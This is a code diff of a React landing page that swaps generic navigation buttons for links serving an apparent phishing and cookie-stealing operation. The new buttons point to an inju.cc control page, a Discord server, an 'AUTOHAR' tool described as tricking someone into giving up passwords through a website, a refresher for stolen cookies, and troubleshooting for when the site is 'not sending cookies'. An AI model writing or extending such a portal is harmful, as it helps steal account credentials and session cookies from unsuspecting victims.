@@ -5,12 +5,12 @@ import { Moon, Sun } from "@/components/ui/celestial-bodies";
 import { motion } from "framer-motion";
 
 const buttons = [
-  { id: 1, label: "EXPLORE", info: "Discover new frontiers", href: "/explore" },
-  { id: 2, label: "CONNECT", info: "Join the network", href: "/connect" },
-  { id: 3, label: "ANALYZE", info: "Process the data", href: "/analyze" },
-  { id: 4, label: "DEPLOY", info: "Launch your mission", href: "/deploy" },
-  { id: 5, label: "MONITOR", info: "Track progress", href: "/monitor" },
-  { id: 6, label: "CONTROL", info: "Take command", href: "/control" }
+  { id: 1, label: "INJU.CC", info: "This is the main website to the inju.cc domain, if you are new please follow troubleshooting steps", href: "https://inju.cc/u/MainControlPage" },
+  { id: 2, label: "DISCORD", info: "Join the Offical server for downtimes, updates, and more!!!", href: "https://discord.gg/injuv3" },
+  { id: 3, label: "AUTOHAR", info: "Autohar is a way of tricking someone into giving you there ps through a website (AUTOHAR IS NOT MINE)", href: "https://bloxtools.in/controlPage/create" },
+  { id: 4, label: "REFRESHER", info: "Refresh your cookies that you get to prevent theft over others if wanted", href: "https://inju.cc/tools/refresher" },
+  { id: 5, label: "TROUBLESHOOT", info: "If you are new or if site is not sending cookies, or hit title is something other than 'INJURIES' Use this", href: "https://discord.com/channels/1286805719911370783/1333224210398445588" },
+  { id: 6, label: "YOUTUBE", info: "We currently dont have one at the moment", href: "/control" }
 ];
 
 export default function Home() {
